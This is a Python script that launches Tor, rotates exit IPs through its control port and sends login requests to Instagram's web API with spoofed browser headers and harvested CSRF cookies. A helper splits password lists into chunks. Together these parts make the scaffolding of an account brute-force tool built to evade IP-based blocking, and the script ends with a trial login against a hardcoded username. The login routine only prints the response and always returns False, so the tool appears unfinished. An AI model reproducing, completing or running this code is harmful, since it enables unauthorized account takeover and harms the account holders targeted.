#!/usr/bin/python3
import os
from timeit import default_timer
from shutil import which
from stem.control import Controller
from stem import Signal
import requests
from bs4 import BeautifulSoup
import json

class Tor(): 
    """
    Tor controlling class
    """
    def __init__(self,cport : int,hport : int,timeout = 20):
        self.cport = cport
        self.hport = hport
        self.timeout = timeout
        if which("tor") == None:
            raise OSError("Tor not found")

    def change_ip(self):
        with Controller.from_port(port=self.cport) as c:
            c.authenticate()
            c.signal(Signal.NEWNYM)

    def start(self):
        self.stop()
        self.mktemp_config()
        os.system("{} -f .torrc > .stdout &".format(which("tor")))
        start_time = default_timer()
        while True:
            with open(".stdout","r") as file:
                lines = file.read().split("\n")
                if len(lines) > 3 and "Bootstrapped 100%" in lines[-2]:
                        return "Started"
                else:
                    if abs(start_time-default_timer()) > self.timeout:
                        self.stop()
                        return "Timeout"
                    else:
                        continue
                file.close()

    def mktemp_config(self):
        file = open(".torrc","w")
        file.write("ControlPort {}\nHTTPTunnelPort {}".format(self.cport,self.hport))
        file.close()

    def stop(self):
        return os.system("pkill {} > /dev/null 2>&1 ".format(os.path.basename(which("tor"))))

    def proxy(self):
        return {"http": "http://localhost:{}".format(self.hport), "https": "http://localhost:{}".format(self.hport)}


class Instagram():
    """
    Instagram controller
    """
    def __init__(self,username,use_tor=None):
        self.use_tor = use_tor
        self.username = username
        self.session = requests.session()
        self.session.max_redirects = 500
        self.head_pre = {
            "Host": "i.instagram.com",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Access-Control-Request-Method":"POST",
            "Access-Control-Request-Headers": "x-asbd-id,x-csrftoken,x-ig-app-id,x-ig-www-claim,x-instagram-ajax",
            "Referer": "https://www.instagram.com/",
            "Origin": "https://www.instagram.com",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "TE": "trailers"
            }

    def ipaddr(self) -> str:
        return self.session.get("https://httpbin.org/ip").json()["origin"]

    def split_passwords(self,passwords,nof) -> list:
        chunk_size = len(passwords)//nof
        if chunk_size > 0:
            return [passwords[i:i + chunk_size] for i in range(0,len(passwords),chunk_size)]
        else:
            return passwords

    def get_cookies(self):
        self.session.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/",headers=self.head_pre) 
        cookies = self.session.cookies.get_dict()
        if "csrftoken" in cookies.keys():
            with open(".cookie","w") as file:
                file.write(str(cookies).replace("'",'"'))
                file.close
        else:
            with open(".cookie","r") as file:
                cookies = json.load(file)
                file.close()
        return cookies

    def get_universal_headers(self):
        response_cookies = self.get_cookies()
        return {
            "Host": "i.instagram.com",
            "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "X-CSRFToken": response_cookies["csrftoken"],
            "Content-Type":"application/x-www-form-urlencoded",
            "Content-Length":"324",
            "Origin":"https://www.instagram.com",
            "Alt-Used": "i.instagram.com",
            "Connection": "keep-alive",
            "Referer": "https://www.instagram.com/",
            "Cookie":"ig_did={}; ig_nrcb={}; mid={}; csrftoken={}".format(response_cookies["ig_did"],response_cookies["ig_nrcb"],response_cookies["mid"],response_cookies["csrftoken"]),
            "Sec-Fetch-Dest":"empty",
            "Sec-Fetch-Mode":"cors",
            "Sec-Fetch-Site": "same-site",
            "TE": "trailers",
        }

    def login(self,password) -> bool:
        if self.use_tor is not None:
            self.session.proxies = self.use_tor.proxy()
        url = "https://i.instagram.com/api/v1/web/accounts/login/ajax/"
        data = {
            'username': f'{self.username}',
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        self.session.cookies.clear()
        head_post = self.get_universal_headers()
        print(self.session.post(url,data = data,headers=head_post).text)
        return False

tor = Tor(9876,4949)
tor.start()
ig = Instagram("tdynamos.linux",use_tor=tor)
ig.login("sometest")
